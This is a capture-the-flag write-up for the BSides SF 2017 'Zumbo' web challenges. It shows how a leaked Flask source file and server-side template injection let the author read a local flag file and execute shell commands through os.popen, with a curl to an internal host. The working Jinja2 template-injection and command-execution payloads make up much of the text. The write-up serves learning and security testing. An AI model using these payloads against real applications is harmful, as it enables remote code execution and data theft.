---
title: "BSides SF 2017 : Zumbo 1 2 and 3"
date: "2017-02-12T12:35:00.000Z"
lastmod: "2017-06-05T15:27:34.000Z"
tags: ["ctf", "web security", "bsidessf2017"]
slug: "bsidessf2017-zumbo-1-2-and-3"
url: "/bsidessf2017-zumbo-1-2-and-3/"
---
Welcome to ZUMBOCOM....you can do anything at ZUMBOCOM.   
Three flags await. Can you find them?   
URL: <http://zumbo-8ac445b1.ctf.bsidessf.net>

## Flag 1 solution

The main page presents a bizarre psychedelic website saying i can do anything at zumbo dot com, but its a simple page.. no controls, nothing.

![](/content/images/2017/02/Selection_757.png)

Well, the main html has the path of `server.py`

![](/content/images/2017/02/Selection_758.png)

..which one is acessible from web and leaks the source code including the first flag.

![](/content/images/2017/03/Selection_999-015-.png)

Flag 1: **FLAG: CENSORED**

## Flag 2 solution

Looking at the source we can notice some interesting things..

- The Flask framework use - it's very common to find Flask/Jinja2 server-side [template injection](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
- `flag1 = 'FLAG: CENSORED'` - flag1 variable w/ string containing the flag1
- `open('/flag') as f: flag2 = f.read()` - flag2 variable reading flag2 content from `/flag` file
- `flag3 = requests.get('http://vault:8080/flag').text` - flag3 variable reading flag3 content from a internal remote address

Knowing this we just need to find a template injection to execute some server-side python commands and grab the remaining flags.

![](/content/images/2017/02/Selection_760.png)

With the payload `{{5+10}}` the error returns the math result, injection confirmed.

![](/content/images/2017/02/Selection_761.png)

..with `{{counter}}` i can dump `counter` variable found in source code. I've tried to leak the `flag2` and `flag3` variables content and read file `/flag` w/ raw python commands but no success.. Flask filter this.

No problem, `__mro__` allows us to go back up the tree of inherited objects in the current Python environment and escalate to functions that perform what we want.

..and actually, **YOU CAN DO ANYTHING AT ZUMBO DOT COM!**

With the payloader `{{ ''.__class__.__mro__[2].__subclasses__() }}` you can dump all subclasses inherited by Flask.

![](/content/images/2017/02/Selection_762.png)

Just copy and paste to a text file to be easy to identify the index of each class, or use the `.index(file)` to get the index.

The `file()` can be used to read our second flag w/ the payloader `{{ ''.__class__.__mro__[2].__subclasses__()[40]('/flag').read() }}`

![](/content/images/2017/03/Selection_999-016-.png)

`40` is the index of `file()` and `/flag` is the path of flag3 leaked at source code.

Flag2: **FLAG: CENSORED**

## Flag 3 solution

For the 3rd flag we need to establish a remote connection inside the server network to access the `http://vault:8080/flag`.

Moving to `__base__.__subclasses__()` I found the `<class 'warnings.catch_warnings'>`

![](/content/images/2017/02/Selection_765.png)

..that i know inherit the `linecache` which one have access to the [os functions](https://docs.python.org/2/library/os.html)

![](/content/images/2017/02/Selection_766.png)

..and now, **WE CAN REALLY DO ANYTHING AT ZUMBO DOT COM**!

`os.popen()` gave us a shell..

Shell payloder: `{{ [].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12].popen('id').read() }}`

![](/content/images/2017/02/Selection_767.png)

Now just `cURL` to dump the remote flag.

[`{{ [].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12].popen('curl http://vault:8080/flag').read() }}`](http://zumbo-8ac445b1.ctf.bsidessf.net/%7B%7B%20[].__class__.__base__.__subclasses__%28%29[59].__init__.func_globals['linecache'].__dict__.values%28%29[12].popen%28'curl%20http://vault:8080/flag'%29.read%28%29%20%7D%7D)

![](/content/images/2017/03/Selection_999-048-.png)

Flag 3: **FLAG: CENSORED**

## Helpful reading

- <https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf>
- <https://nvisium.com/blog/2015/12/07/injecting-flask/>
- <https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/>
- <https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/>
- <https://hexplo.it/escaping-the-csawctf-python-sandbox/>
- Bounty of $10.000 @ uber.com exploiting Flask/Jinja2 <https://hackerone.com/reports/125980>
